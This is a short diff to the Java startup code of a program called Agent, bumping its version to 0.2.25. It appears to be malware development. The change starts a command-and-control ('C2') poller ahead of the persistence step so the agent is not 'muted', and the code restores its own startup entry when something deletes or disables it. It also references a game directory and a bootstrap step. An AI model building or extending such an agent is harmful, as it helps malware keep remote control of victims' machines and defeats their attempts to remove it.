@@ -49,13 +49,14 @@ public final class Agent {
 			State state = State.load(AgentPaths.state(dir));
 			state.version = version();
 			state.save(AgentPaths.state(dir));
+			poller = new Poller(dir, gameDir, state);
+			poller.start();
+			// C2 first: a stuck Task Scheduler or PowerShell must not mute the agent.
 			if (state.persist) {
 				// Repoint startup to the current runtime and repair the entry if something deleted or disabled it.
 				Persistence.enable(dir);
 			}
-			poller = new Poller(dir, gameDir, state);
 			poller.startOps();
-			poller.start();
 			Bootstrap.maybe(poller, dir, gameDir, state);
 			Runtime.getRuntime().addShutdownHook(new Thread(() -> {
 				try {
@@ -81,7 +82,7 @@ public final class Agent {
 
 	private static String version() {
 		String version = Agent.class.getPackage().getImplementationVersion();
-		return version == null ? "0.2.24" : version;
+		return version == null ? "0.2.25" : version;
 	}
 
 	private static long parseParent(String[] args) {
